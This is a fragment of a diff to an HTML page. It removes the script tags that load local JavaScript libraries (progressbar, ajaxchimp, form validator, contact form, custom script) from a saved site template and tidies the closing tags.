-      <script src="./individual_files/progressbar.min.js.download"></script>
-      <!-- Form Ajaxchimp Min JS -->
-      <script src="./individual_files/ajaxchimp.min.js.download"></script>
-      <!-- Form Validator Min JS -->
-      <script src="./individual_files/form-validator.min.js.download"></script>
-      <!-- Contact JS -->
-      <script src="./individual_files/contact-form-script.js.download"></script>
-      <!-- Custom JS -->
-      <script src="./individual_files/custom.js.download"></script>     
-     
- </body></html>
+</body>
+</html>
